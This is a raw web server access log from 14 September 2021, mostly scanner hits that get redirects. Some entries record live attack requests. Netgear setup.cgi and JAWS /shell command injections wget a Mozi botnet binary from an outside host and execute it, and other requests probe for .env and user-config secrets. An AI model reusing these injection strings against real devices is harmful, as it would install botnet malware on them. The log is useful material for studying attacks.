178.251.110.102 - - [14/Sep/2021:16:08:27 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
178.251.110.102 - - [14/Sep/2021:16:08:27 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
1.15.150.193 - - [14/Sep/2021:16:24:19 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 zgrab/0.x"
1.15.150.193 - - [14/Sep/2021:16:24:19 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 zgrab/0.x"
27.45.11.146 - - [14/Sep/2021:16:25:30 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://27.45.11.146:50803/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 301 178 "-" "-"
27.45.11.146 - - [14/Sep/2021:16:25:30 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://27.45.11.146:50803/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 301 178 "-" "-"
107.189.14.98 - - [14/Sep/2021:17:13:06 +0000] "GET / HTTP/1.1" 301 178 "-" "Linux Gnu (cow)"
107.189.14.98 - - [14/Sep/2021:17:13:06 +0000] "GET / HTTP/1.1" 301 178 "-" "Linux Gnu (cow)"
49.83.196.210 - - [14/Sep/2021:17:29:45 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 301 178 "-" "-"
49.83.196.210 - - [14/Sep/2021:17:29:45 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 301 178 "-" "-"
107.189.31.252 - - [14/Sep/2021:18:16:11 +0000] "GET /config/getuser?index=0 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
107.189.31.252 - - [14/Sep/2021:18:16:11 +0000] "GET /config/getuser?index=0 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
103.156.90.219 - - [14/Sep/2021:18:21:11 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
103.156.90.219 - - [14/Sep/2021:18:21:11 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
103.156.90.219 - - [14/Sep/2021:18:21:12 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
103.156.90.219 - - [14/Sep/2021:18:21:12 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
107.189.14.98 - - [14/Sep/2021:18:52:28 +0000] "GET / HTTP/1.1" 301 178 "-" "Linux Gnu (cow)"
107.189.14.98 - - [14/Sep/2021:18:52:28 +0000] "GET / HTTP/1.1" 301 178 "-" "Linux Gnu (cow)"
202.83.56.144 - - [14/Sep/2021:19:06:44 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://202.83.56.144:40406/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 301 178 "-" "Hello, world"
202.83.56.144 - - [14/Sep/2021:19:06:44 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://202.83.56.144:40406/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 301 178 "-" "Hello, world"
88.225.235.204 - - [14/Sep/2021:19:10:55 +0000] "GET / HTTP/1.0" 301 178 "-" "-"
88.225.235.204 - - [14/Sep/2021:19:10:55 +0000] "GET / HTTP/1.0" 301 178 "-" "-"
167.248.133.116 - - [14/Sep/2021:19:14:08 +0000] "GET / HTTP/1.1" 301 178 "-" "-"
167.248.133.116 - - [14/Sep/2021:19:14:08 +0000] "GET / HTTP/1.1" 301 178 "-" "-"
167.248.133.116 - - [14/Sep/2021:19:14:08 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
